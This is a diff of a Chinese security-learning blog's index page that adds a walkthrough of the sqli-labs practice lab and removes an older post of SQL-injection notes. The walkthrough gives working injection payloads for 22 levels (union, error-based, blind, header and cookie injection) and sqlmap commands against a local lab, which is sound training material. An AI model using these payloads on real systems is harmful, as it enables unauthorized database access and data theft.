@@ -69,6 +69,126 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sqli-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/26/sqli-labs/" class="article-date">
+  <time class="dt-published" datetime="2024-12-26T07:00:19.000Z" itemprop="datePublished">2024-12-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/12/26/sqli-labs/">sqli-labs</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="搭建">搭建</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker run -it -d --name sqli-labs -p 80:80 -p 13306:3306 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
+
+<h2><span id="过关">过关</span></h2><h3><span id="第1关">第1关</span></h3><p>闭合符号是<code>&#39;</code>，直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第2关">第2关</span></h3><p>数字型，没有闭合符号，直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第3关">第3关</span></h3><p>闭合符号是<code>&#39;)</code>，直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第4关">第4关</span></h3><p>闭合符号是<code>&quot;)</code>，直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;)  union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第5关">第5关</span></h3><p>闭合符号是<code>&#39;</code>，不能联合查询，不能直接干，可以报错，直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select database()))) --+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第6关">第6关</span></h3><p>闭合符号是<code>&quot;</code>，不能直接干，可以报错，直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;  and extractvalue(0x0a,concat(0x0a,(select database())))--+</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第7关">第7关</span></h3><p>闭合符号是<code>&#39;))</code>,布尔盲注,直接干🙅,sqlmap一把梭</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)) and left(database(), 1) &gt; &#x27;</span>t<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://localhost:7777/Less-7/?id=1&#x27; -v 3 --dbms mysql --tech B -p id</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第8关">第8关</span></h3><p>闭合符号是<code>&#39;</code>,布尔盲注,直接干不了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(1) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一把梭哈</span></span><br><span class="line">sqlmap -u &#x27;http://localhost:7777/Less-8/?id=1&#x27; -v 3 --dbms mysql --tech B</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第9关">第9关</span></h3><p>闭合符号是<code>&#39;</code>,时间盲注,直接干不了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(1) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一把梭哈</span></span><br><span class="line">sqlmap -u &#x27;http://localhost:7777/Less-9/?id=1&#x27; -v 3 --dbms mysql --tech T --batch -p id</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第10关">第10关</span></h3><p>闭合符号是<code>&quot;</code>,时间盲注,直接干不了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&quot; and sleep(1) --+</span><br></pre></td></tr></table></figure>
+
+<p>跟第9关一样，不写了,sqlmap一把梭</p>
+<h3><span id="第11关">第11关</span></h3><p>这一关要登陆，我们去前几关整几个账号密码，开干username:Dumb,password:Dumb</p>
+<p>闭合符号是<code>&#39;</code>,报错注入,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span>Dumb<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit<span class="operator">&amp;</span>uname<span class="operator">=</span>Dumb<span class="string">&#x27; or extractvalue(0x0a,concat(0x0a,(select database())))--+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第12关">第12关</span></h3><p>闭合符号是<code>&quot;)</code>,报错注入,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span>Dumb<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit<span class="operator">&amp;</span>uname<span class="operator">=</span>Dumb&quot;) and extractvalue(0x0a,concat(0x0a,(select database()))) --+</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第13关">第13关</span></h3><p>闭合符号是<code>&#39;)</code>,报错注入,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span>Dumb<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit<span class="operator">&amp;</span>uname<span class="operator">=</span>Dumb<span class="string">&#x27;) and extractvalue(0x0a,concat(0x0a,(select database()))) --+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第14关">第14关</span></h3><p>闭合符号是<code>&quot;</code>,报错注入,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span>Dumb<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit<span class="operator">&amp;</span>uname<span class="operator">=</span>Dumb&quot; or extractvalue(0x0a,concat(0x0a,(select database()))) --+</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第15关">第15关</span></h3><p>闭合符号是<code>&#39;</code>,布尔盲注,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span>Dumb<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit<span class="operator">&amp;</span>uname<span class="operator">=</span>Dumb<span class="string">&#x27; and 1=0 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>sqlmap一把梭</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r ~/15 -p uname  --dbms mysql</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第16关">第16关</span></h3><p>闭合符号是<code>&quot;)</code>,布尔盲注,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span>Dumb<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit<span class="operator">&amp;</span>uname<span class="operator">=</span>Dumb&quot;) and 1=0  --+</span><br></pre></td></tr></table></figure>
+
+<p>抓包copytofile，sqlmap一把梭</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r ~/15 -p uname  --dbms mysql</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第17关">第17关</span></h3><p>闭合符号是<code>&#39;</code>,updata型的报错注入,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span>Dumb<span class="string">&#x27;and extractvalue(0x0a,concat(0x0a,(select database()))) and&#x27;</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit<span class="operator">&amp;</span>uname<span class="operator">=</span>Dumb</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第18关">第18关</span></h3><p>闭合符号是<code>&#39;</code>,ua头注入,可以报错,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: a<span class="string">&#x27; or  extractvalue(0x0a,concat(0x0a,(select database()))) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第19关">第19关</span></h3><p>闭合符号是<code>&#39;</code>,ref头注入，可以报错,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">        <span class="string">&#x27;or sleep(1) or&#x27;</span></span><br><span class="line">Referer:<span class="string">&#x27; or extractvalue(0x0a,concat(0x0a,(select database())))  or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第20关">第20关</span></h3><p>闭合符号是<code>&#39;</code>,报错注入，注入点在cookie,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>Dumb<span class="string">&#x27; or updatexml(1,concat(1,database(),1),1) --+</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="第21关">第21关</span></h3><p>闭合符号是<code>&#39;)</code>,报错注入,注入点在cookie,加了一层base64,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>RHVtYicpYW5kIGV4dHJhY3R2YWx1ZSgweDBhLGNvbmNhdCgweDBhLChzZWxlY3QgZGF0YWJhc2UoKSkpKSM<span class="operator">%</span><span class="number">3</span>d</span><br></pre></td></tr></table></figure>
+
+<h3><span id="第22关">第22关</span></h3><p>闭合符号是<code>&quot;</code>,报错注入,注入点在cookie,直接干</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>RHVtYiIgYW5kIGV4dHJhY3R2YWx1ZSgweDBhLGNvbmNhdCgweDBhLChzZWxlY3QgZGF0YWJhc2UoKSkpKSAgIw<span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">3</span>d</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/26/sqli-labs/" data-id="cm54z5b740000emiwd07mflxi" data-title="sqli-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-day33_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/12/25/day33_kls/" class="article-date">
@@ -742,115 +862,6 @@
 
 
   
-    <article id="post-day25_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/14/day25_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-14T14:34:50.000Z" itemprop="datePublished">2024-12-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/14/day25_kls/">day25_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="sql注入">sql注入</span></h2><h3><span id="分类">分类</span></h3><p>依据获取信息的方式分类</p>
-<p>联合查询注入</p>
-<p>报错注入</p>
-<p>盲注</p>
-<p>布尔</p>
-<p>时间</p>
-<p>特殊注入</p>
-<p>宽字节注入</p>
-<p>二次编码注入</p>
-<p>二阶注入</p>
-<p>堆叠注入</p>
-<p>其他类型的注入</p>
-<p>值得注意的是，挖这一类要小心再小心，不然慧翅捞饭的</p>
-<p>insert</p>
-<p>update</p>
-<p>delete</p>
-<h3><span id="原因">原因</span></h3><p>用户可控的输入未经严格过滤拼接到了sql中，导致恶意sql被执行</p>
-<h3><span id="危害">危害</span></h3><p>信息泄漏</p>
-<p>信息篡改</p>
-<p>远程控制，木马</p>
-<h3><span id="挖掘">挖掘</span></h3><p>手动测试的一般步骤</p>
-<p>实现网站正常功能</p>
-<p>测试闭合符号</p>
-<p>注入</p>
-<p>报敏感信息</p>
-<h3><span id="利用">利用</span></h3><p>mysql</p>
-<p>元数据</p>
-<p>information_schema</p>
-<p>schmata</p>
-<p>schema_name数据库名</p>
-<p>tables</p>
-<p>table_name表名</p>
-<p>columns</p>
-<p>column_name列名</p>
-<p>数据库</p>
-<p>SELECT NULL, schema_name FROM information_schema.schemata–</p>
-<p>表名</p>
-<p>SELECT NULL, table_name FROM information_schema.tables WHERE table_schema &#x3D; ‘your_database_name’–</p>
-<p>列名</p>
-<p>SELECT NULL, column_name FROM information_schema.columns WHERE table_name &#x3D; ‘your_table_name’–</p>
-<p>查询注入点列数</p>
-<p>group by 2 –</p>
-<p>查找回显位</p>
-<p>union select 1,2,3,4</p>
-<p>常用函数</p>
-<p>USER()</p>
-<p>CONCAT()</p>
-<p>CURRENT_USER()</p>
-<p>VERSION()</p>
-<p>报错注入</p>
-<p>foor</p>
-<p>updatexml(1,concat(1,(sql)),1)</p>
-<p>extractvalue(0x0a,concat(0x0a,(sql)))</p>
-<p>盲注用</p>
-<p>SUBSTRING()</p>
-<p>LEFT()</p>
-<p>CHAR_LENGTH()</p>
-<p>LENGTH()</p>
-<p>ASCII()</p>
-<h3><span id="防御">防御</span></h3><p>白名单</p>
-<p>只允许用户传入变量为某些特定值，如只允许数字</p>
-<p>黑名单</p>
-<p>过滤恶意字符</p>
-<p>pdo预处理</p>
-<h3><span id="绕过防御">绕过防御</span></h3><p><a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">SQL注入针对关键字过滤的绕过技巧 zu1k</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/14/day25_kls/" data-id="cm4ockle5000ta3iw0zrmelos" data-title="day25_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -876,7 +887,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cdn/" rel="tag">cdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie/" rel="tag">cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cors/" rel="tag">cors</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/" rel="tag">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-compose/" rel="tag">docker-compose</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firewalld/" rel="tag">firewalld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/get/" rel="tag">get</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/" rel="tag">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ip%E6%8E%A2%E6%B4%BB/" rel="tag">ip探活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" rel="tag">linux常见服务</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/post/" rel="tag">post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selinux/" rel="tag">selinux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/session/" rel="tag">session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-copy-id/" rel="tag">ssh-copy-id</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysinfo/" rel="tag">sysinfo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ufw/" rel="tag">ufw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virt-manager/" rel="tag">virt-manager</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" rel="tag">指纹识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" rel="tag">站点架构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag">端口扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" rel="tag">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cdn/" rel="tag">cdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie/" rel="tag">cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cors/" rel="tag">cors</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/" rel="tag">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-compose/" rel="tag">docker-compose</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firewalld/" rel="tag">firewalld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/get/" rel="tag">get</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/" rel="tag">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ip%E6%8E%A2%E6%B4%BB/" rel="tag">ip探活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" rel="tag">linux常见服务</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/post/" rel="tag">post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selinux/" rel="tag">selinux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/session/" rel="tag">session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-copy-id/" rel="tag">ssh-copy-id</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysinfo/" rel="tag">sysinfo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ufw/" rel="tag">ufw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virt-manager/" rel="tag">virt-manager</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" rel="tag">指纹识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" rel="tag">站点架构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag">端口扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" rel="tag">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
     </div>
   </div>
 
@@ -886,7 +897,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/blog/" style="font-size: 13.33px;">blog</a> <a href="/tags/burpsuite/" style="font-size: 13.33px;">burpsuite</a> <a href="/tags/cdn/" style="font-size: 10px;">cdn</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/cors/" style="font-size: 10px;">cors</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/docker/" style="font-size: 13.33px;">docker</a> <a href="/tags/docker-compose/" style="font-size: 13.33px;">docker-compose</a> <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/exam/" style="font-size: 16.67px;">exam</a> <a href="/tags/firewalld/" style="font-size: 10px;">firewalld</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/get/" style="font-size: 10px;">get</a> <a href="/tags/http/" style="font-size: 13.33px;">http</a> <a href="/tags/iptables/" style="font-size: 10px;">iptables</a> <a href="/tags/ip%E6%8E%A2%E6%B4%BB/" style="font-size: 10px;">ip探活</a> <a href="/tags/kls/" style="font-size: 20px;">kls</a> <a href="/tags/linux/" style="font-size: 16.67px;">linux</a> <a href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;">linux常见服务</a> <a href="/tags/post/" style="font-size: 10px;">post</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/review/" style="font-size: 13.33px;">review</a> <a href="/tags/selinux/" style="font-size: 10px;">selinux</a> <a href="/tags/session/" style="font-size: 10px;">session</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/smb/" style="font-size: 10px;">smb</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16.67px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssh-copy-id/" 